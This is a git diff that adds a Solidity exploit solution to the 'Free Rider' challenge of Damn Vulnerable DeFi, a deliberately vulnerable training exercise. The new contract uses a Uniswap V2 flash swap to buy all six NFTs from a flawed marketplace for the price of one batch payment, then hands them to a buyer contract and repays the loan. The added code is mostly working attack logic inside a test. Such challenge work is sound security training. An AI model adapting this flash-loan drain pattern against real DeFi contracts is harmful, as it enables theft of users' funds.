@@ -9,6 +9,79 @@ import {IUniswapV2Router02, IUniswapV2Factory, IUniswapV2Pair} from "../../../sr
 import {DamnValuableNFT} from "../../../src/Contracts/DamnValuableNFT.sol";
 import {DamnValuableToken} from "../../../src/Contracts/DamnValuableToken.sol";
 import {WETH9} from "../../../src/Contracts/WETH9.sol";
+import {IERC721Receiver} from "openzeppelin-contracts/token/ERC721/IERC721Receiver.sol";
+
+contract AttackingCallee {
+
+    address private freeRiderBuyer;
+    FreeRiderNFTMarketplace private freeRiderNFTMarketplace;
+    IUniswapV2Pair private uniswapV2Pair;
+    WETH9 private weth;
+    address payable private attacker;
+    DamnValuableNFT internal damnValuableNFT;
+
+    constructor(
+        address _freeRiderBuyer,
+        FreeRiderNFTMarketplace _freeRiderNFTMarketplace,
+        IUniswapV2Pair _uniswapV2Pair,
+        WETH9 _weth,
+        address payable _attacker,
+        DamnValuableNFT _damnValuableNFT
+    ) payable {
+        freeRiderBuyer = _freeRiderBuyer;
+        freeRiderNFTMarketplace = _freeRiderNFTMarketplace;
+        uniswapV2Pair = _uniswapV2Pair;
+        weth = _weth;
+        attacker = _attacker;
+        damnValuableNFT = _damnValuableNFT;
+    }
+
+    function startFlashSwap() external {
+        uniswapV2Pair.swap(0, 15 ether, address(this), abi.encodePacked(uint8(1)));
+    }
+
+    // called by v2 pair
+    function uniswapV2Call(
+        address sender, 
+        uint amount0, 
+        uint amount1, 
+        bytes calldata data) external {
+        // unwrap WETH to ETH
+        weth.withdraw(15 ether);
+        // Just buy everything in marketplace
+        uint256[] memory buyOrders = new uint256[](6);
+        for (uint8 i = 0; i < 6; ) {
+            buyOrders[i] = i;
+            unchecked {
+                ++i;
+            }
+        }
+        freeRiderNFTMarketplace.buyMany{value: 15 ether}(buyOrders);
+        // send NFTs to buyer
+        for (uint8 i = 0; i < 6; ) {
+            damnValuableNFT.safeTransferFrom(address(this), freeRiderBuyer, i);
+            unchecked {
+                ++i;
+            }
+        }
+        // cleanup swap
+        weth.deposit{value: 15.3 ether}();
+        // payback the loan
+        weth.transfer(address(uniswapV2Pair), 15.3 ether);
+    }
+
+    receive() external payable {}
+
+    function onERC721Received(
+        address,
+        address,
+        uint256 _tokenId,
+        bytes memory
+    ) external returns (bytes4) {
+        // skip checks.
+        return IERC721Receiver.onERC721Received.selector;
+    }
+}
 
 contract FreeRider is Test {
     // The NFT marketplace will have 6 tokens, at 15 ETH each
@@ -149,7 +222,19 @@ contract FreeRider is Test {
 
     function testExploit() public {
         /** EXPLOIT START **/
-
+        AttackingCallee attackingCallee = new AttackingCallee{
+            value: 0.3 ether
+            } (
+            address(freeRiderBuyer),
+            freeRiderNFTMarketplace,
+            uniswapV2Pair,
+            weth,
+            attacker,
+            damnValuableNFT
+        );
+        // call swap on the pair directly, with our callie
+        vm.prank(attacker, attacker);
+        attackingCallee.startFlashSwap();
         /** EXPLOIT END **/
         validation();
     }
